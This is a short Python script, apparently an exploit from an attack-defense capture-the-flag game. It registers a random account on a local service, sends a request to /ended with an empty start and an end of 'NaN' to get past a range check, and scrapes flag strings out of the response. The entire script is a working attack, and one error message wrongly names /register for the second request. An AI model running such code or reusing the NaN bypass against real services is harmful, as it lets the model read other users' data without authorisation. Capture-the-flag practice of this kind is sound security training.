import random
import string
import requests
import re

URL = "http://localhost:8888"
FLAG_RE = "[A-Z0-9]{31}="

with requests.session() as s:
    gen = lambda: "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    username = gen()
    password = gen()

    resp = s.post(
        URL + "/register",
        data={"username": username, "password": password},
        allow_redirects=False,
    )
    if resp.status_code != 302:
        raise Exception(f"Invalid status code on /register: {resp.status_code}")

    resp = s.get(URL + "/ended?start=&end=NaN")
    if resp.status_code != 200:
        raise Exception(f"Invalid status code on /register: {resp.status_code}")
    
    flags = re.findall(FLAG_RE, resp.text)
    print(flags[:10])